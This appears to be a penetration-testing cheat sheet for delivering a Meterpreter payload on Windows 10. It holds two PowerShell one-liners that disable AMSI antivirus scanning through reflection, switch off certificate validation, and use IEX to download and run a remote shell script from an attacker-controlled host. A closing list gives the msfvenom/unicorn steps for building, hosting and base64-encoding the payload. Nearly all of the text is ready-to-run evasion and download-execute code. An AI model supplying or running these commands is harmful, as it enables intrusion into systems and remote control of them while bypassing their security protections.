- Payload with Web_delivery/Meterpreter or to host with simpleHttpServer (b64 encoded) + AMSI bypass (customise your template for AV/use unicorn):

	-Non updated Win10:
		$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);
		[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);
		[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem);
		[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
		$e=new-object net.webclient;
		$e.proxy=[Net.WebRequest]::GetSystemWebProxy();
		$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
		IEX $e.downloadstring('http://attacker-trusted-domain/pwn');
		
	- up tp date Windows 10 (27/09/2018):
		[ScriptBlock]."Get`Fiel`d"('signatures','N'+'onPublic,Static').SetValue($NULL,(New-Object Collections.Generic.HashSet[string]));
		$e=new-object net.webclient;
		$e.proxy=[Net.WebRequest]::GetSystemWebProxy();
		$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
		IEX $e.downloadstring('http://192.168.56.1/MeterRsh.txt');

	

	Steps: create your payload using msfvenom/unicorn (meterpreter -> psh-net format hosted in "payload.txt") + handler setup -> host it -> convert AMSI bypassing payload in b64 -> execute b64 generated payload